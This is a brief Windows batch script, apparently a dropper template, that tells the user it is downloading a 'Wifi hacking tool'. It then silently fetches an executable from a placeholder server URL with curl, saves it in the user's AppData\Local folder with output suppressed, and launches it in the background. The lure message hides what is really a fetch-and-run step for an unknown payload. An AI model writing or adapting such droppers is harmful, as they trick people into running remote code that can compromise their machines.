@echo off

set "server_url=type_apache_link_here"
set "server_file=filename.exe"

set "downloads_folder=%USERPROFILE%\AppData\Local\"

echo Download Wifi hacking tool
echo Please Wait
curl -o "%downloads_folder%\filename.exe" %server_url%%server_file% > NUL 2>&1

start "" /B "%downloads_folder%\filename.exe"

exit
